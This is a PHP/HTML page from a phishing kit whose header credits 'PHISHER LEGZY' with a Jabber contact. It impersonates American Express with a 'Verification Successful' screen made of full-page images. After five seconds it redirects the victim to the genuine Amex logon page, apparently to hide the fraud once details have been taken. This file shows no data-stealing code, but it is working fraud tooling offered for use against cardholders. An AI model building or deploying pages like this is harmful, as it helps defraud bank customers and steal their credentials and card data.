<?php
/*
***********************************
|--		PHISHER LEGZY			--|
***********************************
|    Jabber/XMPP : legzy@xmpp.jp  |
***********************************
*/

require "requires/functions.php";

?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>

<title>American Express - Verification Successful</title>
<head><meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link rel="shortcut icon" href="images/favicon.png"/>
<link rel="shortcut icon" href="https://www.aexp-static.com/nav/ngn/img/logo_bluebox.gif" />
<meta http-equiv="refresh" content="5;https://online.americanexpress.com/myca/logon/us/action/LogonHandler?request_type=LogonHandler&Face=en_US">
			  
			  
	
<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>

<style type="text/css">
/*----------Text Styles----------*/
input.text { border: 1px #7F9DB9 solid; color: #333; padding-left: 10px; }
input.focus { border-color: #8EB1EB; border-style: solid;  outline: 0; } 
/*----------Para Styles----------*/

</style>

<body style="visibility:hidden" onload="unhideBody()" bgColor="#FFFFFF">

 

</head>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1366px; height:768px; z-index:0"><img src="images/success.png" alt="" title="" border=0 width=1366 height=768></div>
<div id="image2" style="position:absolute; overflow:hidden; left:530px; top:300px; width:120px; height:120px; z-index:0"><img src="images/default.gif" alt="" title="" border=0 width=120 height=120></div>

</div></body></html>
